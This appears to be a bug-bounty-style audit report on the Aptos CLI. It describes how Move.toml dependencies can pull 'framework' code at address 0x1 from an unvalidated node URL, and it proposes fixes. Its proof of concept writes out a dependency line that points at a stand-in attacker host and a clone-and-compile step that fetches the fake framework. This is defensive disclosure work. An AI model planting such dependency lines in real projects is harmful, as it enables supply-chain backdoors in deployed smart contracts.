# Audit Report

## Title
Unvalidated Framework Address Downloads Enable Supply Chain Attacks via Malicious Node Substitution

## Summary
The `load_account_arg()` function in `crates/aptos/src/common/types.rs` does not reject or validate special system addresses (0x0, 0x1, 0x2-0xa) when used in the package download context. This allows attackers to specify arbitrary node URLs in Move.toml dependencies for framework addresses, enabling substitution of malicious code that appears to come from the official Aptos framework.

## Finding Description
The vulnerability exists in the package dependency resolution mechanism. When a Move.toml file specifies a dependency using the `aptos` field (node URL) and `address` field (package address), the system:

1. Calls `load_account_arg()` to parse the package address [1](#0-0) 

2. The `load_account_arg()` function simply attempts to parse the address string using `AccountAddress::from_str()` without any validation that special framework addresses should be restricted [2](#0-1) 

3. The parsed address is then passed to `CachedPackageRegistry::create()` along with a user-controlled node URL [3](#0-2) 

4. The registry fetches the package from the specified node without any cryptographic verification that the package actually originates from the claimed address [4](#0-3) 

Special addresses in Aptos have protected meanings:
- **0x0** (`@vm_reserved`): Reserved for VM internal use [5](#0-4) 
- **0x1** (`@aptos_framework`): The official Aptos framework [6](#0-5) 
- **0x2-0xa**: Framework-reserved addresses [7](#0-6) 

**Attack Scenario:**
1. Attacker creates a malicious Aptos node or compromises an existing one
2. Attacker creates a Move.toml dependency specification:
   ```toml
   [dependencies]
   AptosFramework = { aptos = "https://malicious-node.com", address = "0x1" }
   ```
3. Attacker distributes this via a compromised repository or social engineering
4. Developer builds the project, triggering dependency resolution
5. The malicious node returns fake "framework" code when queried for address 0x1
6. No verification occurs - the fake code is accepted and compiled into the project
7. Developer deploys compromised smart contracts or executes malicious code locally

This breaks the **Access Control** invariant: "System addresses (@aptos_framework, @core_resources) must be protected" - the system fails to protect the integrity of code claimed to be from system addresses.

## Impact Explanation
This vulnerability qualifies as **Medium severity** under the Aptos bug bounty criteria:
- **Limited funds loss or manipulation**: If compromised contracts are deployed, they could steal or manipulate limited amounts of funds
- **State inconsistencies requiring intervention**: Malicious framework code could cause state corruption requiring cleanup
- **Supply chain attack vector**: Affects the development pipeline rather than runtime consensus

The impact is limited compared to Critical/High severity issues because:
- No direct consensus violation or network-level impact
- Requires developer interaction (using malicious Move.toml)
- Primarily affects development/deployment rather than live network operation
- Developer has some agency in choosing trusted code sources

However, the impact is significant because:
- Framework code from address 0x1 is implicitly trusted
- No warnings are shown when downloading from non-standard nodes
- Successful attacks could affect multiple projects if popular packages are compromised
- Could lead to deployment of backdoored smart contracts on mainnet

## Likelihood Explanation
**Moderate likelihood:**

**Factors increasing likelihood:**
- Move.toml files are commonly shared via git repositories
- Developers regularly clone and build third-party projects
- No visual warnings when dependencies specify custom node URLs
- The attack is subtle - only the node URL differs from legitimate dependencies
- Supply chain attacks are an established attack pattern (npm, PyPI incidents)

**Factors decreasing likelihood:**
- Requires attacker to distribute malicious Move.toml files
- Developers typically use well-known, trusted repositories
- Community review may catch suspicious dependency configurations
- Legitimate use of custom nodes is uncommon for framework dependencies

## Recommendation
Implement validation in `load_account_arg()` or the package download flow to protect special system addresses:

**Option 1 - Address-based validation:**
```rust
pub fn load_account_arg(str: &str) -> Result<AccountAddress, CliError> {
    if let Ok(account_address) = AccountAddress::from_str(str) {
        Ok(account_address)
    } else if let Some(Some(account_address)) =
        CliConfig::load_profile(Some(str), ConfigSearchMode::CurrentDirAndParents)?
            .map(|p| p.account)
    {
        Ok(account_address)
    } else if let Some(Some(private_key)) =
        CliConfig::load_profile(Some(str), ConfigSearchMode::CurrentDirAndParents)?
            .map(|p| p.private_key)
    {
        let public_key = private_key.public_key();
        Ok(account_address_from_public_key(&public_key))
    } else {
        Err(CliError::CommandArgumentError(
            "'--account' or '--profile' after using aptos init must be provided".to_string(),
        ))
    }
}

// Add new validation function for package downloads
pub fn load_package_address_arg(str: &str, node_url: &str) -> Result<AccountAddress, CliError> {
    let address = load_account_arg(str)?;
    
    // Validate that framework addresses only come from trusted nodes
    if is_framework_reserved_address(&address) {
        if !is_trusted_node_url(node_url) {
            return Err(CliError::CommandArgumentError(
                format!("System address {} can only be downloaded from trusted nodes. Use official node URLs or verify package authenticity.", address)
            ));
        }
    }
    
    Ok(address)
}

fn is_framework_reserved_address(addr: &AccountAddress) -> bool {
    // Check if address is 0x0, 0x1, or 0x2-0xa
    *addr == AccountAddress::ZERO 
        || *addr == AccountAddress::ONE
        || (*addr == AccountAddress::TWO)
        || (*addr == AccountAddress::THREE)
        // ... etc for 0x4-0xa
}

fn is_trusted_node_url(url: &str) -> bool {
    // Allowlist of official Aptos nodes
    const TRUSTED_NODES: &[&str] = &[
        "mainnet",
        "testnet", 
        "devnet",
        "https://fullnode.mainnet.aptoslabs.com",
        "https://fullnode.testnet.aptoslabs.com",
        "https://fullnode.devnet.aptoslabs.com",
    ];
    TRUSTED_NODES.contains(&url)
}
```

**Option 2 - Add cryptographic verification:**
Implement signature verification for downloaded packages to ensure authenticity regardless of source node.

**Option 3 - User warning:**
At minimum, warn users when downloading framework addresses from non-standard nodes:
```rust
if is_framework_reserved_address(&address) && !is_trusted_node_url(node_url) {
    eprintln!("⚠️  WARNING: Downloading framework address {} from non-standard node {}", address, node_url);
    eprintln!("   Verify this is intentional and the source is trusted.");
}
```

## Proof of Concept

**Step 1: Create malicious Move.toml**
```toml
[package]
name = "VulnerableProject"
version = "1.0.0"

[dependencies]
# Malicious dependency - framework from attacker-controlled node
AptosFramework = { aptos = "https://attacker-controlled-node.com", address = "0x1" }

[addresses]
vulnerable_project = "_"
```

**Step 2: Set up malicious node (simulation)**
The attacker's node at `https://attacker-controlled-node.com` returns fake package data when queried for `0x1::code::PackageRegistry`. This fake data contains malicious Move code that appears to be the Aptos framework.

**Step 3: Trigger vulnerability**
```bash
# Developer clones repo with malicious Move.toml
git clone https://github.com/attacker/malicious-project.git
cd malicious-project

# Build triggers dependency resolution
aptos move compile

# Result: malicious "framework" code downloaded from attacker's node
# No error or warning is shown
# Fake framework code is compiled into the project
```

**Step 4: Verification**
Examine the downloaded package in `.aptos/` or build cache - it contains code from the attacker's node, not the legitimate Aptos framework at address 0x1 from the official network.

**Impact:** Any code compiled with this malicious dependency inherits the backdoor. If deployed on-chain, it could steal funds, manipulate state, or execute arbitrary attacker-controlled logic while appearing to use the legitimate Aptos framework.

### Citations

**File:** crates/aptos/src/move_tool/package_hooks.rs (L44-49)
```rust
        let registry = CachedPackageRegistry::create(
            Url::parse(info.node_url.as_str())?,
            load_account_arg(info.package_address.as_str())?,
            false,
        )
        .await?;
```

**File:** crates/aptos/src/common/types.rs (L1369-1387)
```rust
pub fn load_account_arg(str: &str) -> Result<AccountAddress, CliError> {
    if let Ok(account_address) = AccountAddress::from_str(str) {
        Ok(account_address)
    } else if let Some(Some(account_address)) =
        CliConfig::load_profile(Some(str), ConfigSearchMode::CurrentDirAndParents)?
            .map(|p| p.account)
    {
        Ok(account_address)
    } else if let Some(Some(private_key)) =
        CliConfig::load_profile(Some(str), ConfigSearchMode::CurrentDirAndParents)?
            .map(|p| p.private_key)
    {
        let public_key = private_key.public_key();
        Ok(account_address_from_public_key(&public_key))
    } else {
        Err(CliError::CommandArgumentError(
            "'--account' or '--profile' after using aptos init must be provided".to_string(),
        ))
    }
```

**File:** crates/aptos/src/move_tool/stored_package.rs (L43-53)
```rust
    pub async fn create(
        url: Url,
        addr: AccountAddress,
        with_bytecode: bool,
    ) -> anyhow::Result<Self> {
        let client = Client::new(url);
        // Need to use a different type to deserialize JSON
        let inner = client
            .get_account_resource_bcs::<PackageRegistry>(addr, "0x1::code::PackageRegistry")
            .await?
            .into_inner();
```

**File:** aptos-move/framework/aptos-framework/sources/system_addresses.move (L45-56)
```text
    public fun is_framework_reserved_address(addr: address): bool {
        is_aptos_framework_address(addr) ||
            addr == @0x2 ||
            addr == @0x3 ||
            addr == @0x4 ||
            addr == @0x5 ||
            addr == @0x6 ||
            addr == @0x7 ||
            addr == @0x8 ||
            addr == @0x9 ||
            addr == @0xa
    }
```

**File:** aptos-move/framework/aptos-framework/sources/system_addresses.move (L58-61)
```text
    /// Return true if `addr` is 0x1.
    public fun is_aptos_framework_address(addr: address): bool {
        addr == @aptos_framework
    }
```

**File:** aptos-move/framework/aptos-framework/sources/system_addresses.move (L74-76)
```text
    public fun is_vm_address(addr: address): bool {
        addr == @vm_reserved
    }
```
